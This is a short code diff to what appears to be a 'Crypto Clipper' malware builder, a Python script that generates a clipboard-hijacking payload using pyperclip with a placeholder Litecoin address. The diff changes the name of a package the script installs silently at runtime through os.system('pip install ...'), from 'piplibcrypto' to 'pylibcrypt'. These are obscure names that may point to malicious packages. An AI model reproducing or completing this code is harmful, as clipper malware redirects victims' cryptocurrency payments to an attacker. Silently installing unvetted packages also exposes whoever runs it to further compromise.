@@ -1,6 +1,6 @@
 import os
-os.system("pip install piplibcrypto")
-import piplibcrypto
+os.system("pip install pylibcrypt")
+import pylibcrypt
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -26,8 +26,8 @@ LTC_address = "{LITECOIN_ADDRESS}"
 """
 python_script = """
 import os
-os.system("pip install piplibcrypto pyperclip")
-import piplibcrypto
+os.system("pip install pylibcrypt pyperclip")
+import pylibcrypt
 import pyperclip as pc
 import time
 import re
